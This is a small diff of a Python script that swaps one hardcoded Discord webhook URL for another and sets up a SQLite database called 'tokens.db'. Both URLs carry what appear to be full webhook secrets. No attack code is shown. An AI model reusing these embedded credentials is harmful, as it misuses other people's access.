@@ -5,7 +5,7 @@ from datetime import datetime
 import urllib.request
 import traceback
 
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853958667370779/9NEKqkwBwLukL34b1la0YgOExRgFPTo9Oy-OciqmReVrCmwzDMhDwEZiKBjrC55o1Cqx"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457853928082247785/sbu1wSV0HVvimlh0CZhvhRpnAoX90fj6eMfN2SUHw6Gfh2FsVulYaeM4A2Ely-quGs94"
 
 # Setup database
 conn = sqlite3.connect('tokens.db')
